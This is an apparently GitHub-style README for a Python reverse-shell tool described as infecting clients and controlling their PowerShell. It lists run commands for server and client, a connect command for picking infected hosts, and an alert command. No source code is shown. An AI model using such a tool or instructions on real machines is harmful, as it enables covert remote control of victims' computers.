# Reverse-Shell
Infects clients and controls their powershell with Python.

#### Requirements

- 🐍 Python 3.x 🐍
- 💫 Open Ports 💫

#### Installation
Linux or Windows or  MacOs

#### [Server]

```sh
python3 server.py
```
#### [Client]
```sh
pip3 install colorama
python3 client.py {ip}
```

#### Extra commands

#### [Menu]

- connect {number}

#### [Shell Commmands]

- alert {title} {message}
- exit
